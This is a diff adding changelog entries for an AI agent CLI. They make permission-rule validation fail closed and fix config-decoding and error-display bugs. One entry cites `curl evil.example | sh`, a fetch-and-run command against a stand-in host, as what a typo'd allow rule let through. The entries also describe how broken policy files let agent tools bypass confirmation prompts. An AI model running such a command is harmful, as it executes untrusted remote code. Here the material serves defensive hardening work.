@@ -13,12 +13,114 @@ _Targeting 0.4.20. Add entries under the relevant heading as work lands._
 
 ### Changed
 
+- **BREAKING — a broken `permissions.json` now aborts session creation instead
+  of silently loading no rules.** Unreadable, not valid UTF-8, malformed JSON, a
+  top level that is not an object, an unknown top-level key, or a rule that
+  fails the new validation all raise `PermissionConfigError` naming the path.
+  The document key set is closed for the same reason the rule key set is:
+  `data.get("rules", [])` swallowed `{"rule": [...]}` whole — the file parsed,
+  every rule was dropped, and `active_permissions()` still reported the file
+  under `loaded_sources`. Every other config file keeps
+  the old warn-and-degrade contract; the policy file is the exception because
+  dropping its rules is not a neutral degradation — a user `deny` on a shell or
+  web tool degrades to *ask*, and a `deny` on an `mcp_*` tool degrades to
+  nothing at all (the engine returns no decision, the runtime falls through to
+  the tool's own `requires_confirmation`, and a `trust: true` server's tool then
+  runs with no prompt). `agentao doctor` reports the same failures **without**
+  aborting — the moment you most need diagnostics is when your config is broken.
+  If you have been running with a malformed policy file without noticing, fix it
+  or move it aside. Documented contract updated at
+  `docs/reference/configuration.md` §4, and
+  `test_invalid_json_user_config_graceful_fallback` is inverted into
+  `test_invalid_json_user_config_fails_closed`.
+
+- **BREAKING — permission rules are validated, and an unknown `action` is now
+  rejected rather than treated as `ask`.** The rule key set is closed (`tool`,
+  `args`, `domain`, `action`; under `domain`: `url_arg`, `allowlist`,
+  `blocklist`) and every field is type-checked, and `tool` / `action` are
+  required rather than defaulted. Absence was the hole a closed key set alone
+  left open: `rule.get("tool", "*")` makes a `tool`-less `{"action": "allow"}`
+  an allow-**everything** rule with no misspelled key for the unknown-field
+  check to catch. Write `{"tool": "*"}` for a deliberate wildcard.
+  `action` stays case-insensitive.
+  The `ask` fallback for unknown values is what let `{"action": "alow"}` sit in a
+  config doing nothing while `/permissions` printed it back as `[? ALOW]`. One
+  validator, `permissions.py::validate_permission_rules`, shared by all three
+  doors into the engine: the file loader, `PermissionEngine(rules=...)`, and
+  `add_run_rules()` (the run spec's `permissions:` block). Rejection is uniform —
+  an invalid `deny` is not kept as "fail-closed and therefore safe", because the
+  `{"tools": ...}` typo turns a single-tool deny into a **deny-all**.
+
 - **Read-only mode's deny message now tells the model not to retry.** It was the
   one deny branch without that close, and it is evaluated first, so it also
   shadowed a PreToolUse hook's. The three copies of the sentence in
   `tool_executor.py` are now one constant.
 
 ### Fixed
+
+- **A one-word typo in a permission rule was a silent privilege escalation.**
+  The engine reads exactly four keys off a rule and checked the type of none of
+  them, so an unrecognised key was ignored in silence — and since the ignored
+  key was usually the rule's *condition*, the rule widened to the whole tool.
+  `{"tool": "run_shell_command", "pattern": "^git ", "action": "allow"}` —
+  `pattern` should be `args` — allowed `curl evil.example | sh` where the correct
+  rule asks, and `/permissions` rendered it as an ordinary `[✓ ALLOW]`. Seven
+  type failures went with it: six raised `AttributeError`/`TypeError` out of
+  `decide_detail()` **mid-turn** at the first tool call (`tool_planning.py` has
+  no `try`/`except` there), and the seventh — `domain.allowlist` written as a
+  string instead of a list — silently downgraded a `deny` to *ask* with no error
+  anywhere. All eight are now construction-time errors.
+
+- **`UnicodeDecodeError` subclasses `ValueError`, so no config reader caught
+  it.** Ten read sites across `permissions.json`, `settings.json`, `mcp.json`,
+  `acp.json` and `skills_config.json` caught `(OSError, json.JSONDecodeError)`
+  and nothing else, so a file that was not valid UTF-8 raised straight through
+  the `except` clause written to contain it. A UTF-16LE `settings.json` — what
+  PowerShell 5.1's `>` and `Out-File` write on stock Windows — killed
+  interactive startup from `AgentaoCLI.__init__`, before the factory ran; a
+  UTF-16LE `permissions.json` crashed `PermissionEngine.__init__` on all five
+  session-construction paths, including ACP `session/new` and sub-agent spawn;
+  and a UTF-16LE `acp.json` bypassed `AcpConfigError` to surface as a raw
+  traceback. This is the missed sibling of a P0 fixed one line lower in
+  `permission-hardening-plan.md`: `isinstance(data, dict)` guards the *parsed*
+  shape, but the *decode* failure happens earlier, on `read_text`. All ten sites
+  now read `utf-8-sig` (so a BOM'd file loads instead of being discarded — reads
+  only; that codec **writes** a BOM) and catch `UnicodeDecodeError` explicitly.
+  `agentao doctor` — the one tool a user reaches for *because* their config is
+  broken — had the same hole.
+
+- **Config readers that swallowed a broken file now say so.** `settings.json`,
+  `mcp.json` and `skills_config.json` returned an empty default for an
+  unreadable, mis-encoded, malformed, or non-object file without a word. A
+  missing file is still silent; everything else warns with the path. Caveat
+  worth knowing: those warnings go to the `agentao` logger, which reaches the
+  terminal only before a handler is attached — in practice the `settings.json`
+  reads are visible and the `mcp.json` / `skills_config.json` ones land in
+  `agentao.log`. `agentao doctor` surfaces all of them. Giving library-module
+  warnings a console handler is a separate decision, deliberately not made here. The *shape* guard travels with it:
+  a top-level JSON list in `settings.json` / `mcp.json` / `skills_config.json`
+  used to reach `.get(...)` and raise `AttributeError` out of CLI startup,
+  MCP config loading and `SkillManager.__init__`; it is now the same
+  warn-and-default. `plugins_config.json` got the `UnicodeDecodeError` clause
+  its sibling reader in the same module already had.
+
+- **An invalid `permissions:` block in a run spec was reported as a runtime
+  error, after the runtime had already been built.** `RunPermissionRule.args` is
+  `Dict[str, Any]`, so pydantic accepts `args: {command: 1}` and the permission
+  validator is the first thing to reject it — a *spec* error. It was checked
+  after `build_from_environment()`, so any unrelated construction failure (a
+  missing API key, an unusable user permissions file) reported first and turned
+  exit 2 into exit 1; and on the success path the whole agent plus its on-disk
+  side effects were created before the invalid input was rejected. Now validated
+  beside the other spec checks, before any runtime exists.
+
+- **Error text could crash the code that displays it.** Permission validation
+  quotes the offending key verbatim, so a rule field literally named `[/oops]` —
+  or an `OSError` stringifying as `[Errno 13] ...`, or a repo under `~/[wip]/` —
+  reached Rich as markup. The interactive `Fatal error:` handler and
+  `agentao doctor`'s renderer both interpolated it unescaped, raising
+  `MarkupError` in place of the typed startup error or the finished report.
+  Every dynamic value at both boundaries is now escaped.
 
 - **A PreToolUse hook's deny reason never reached the model.** The reason was
   parsed, prefixed, and delivered to the *host* on
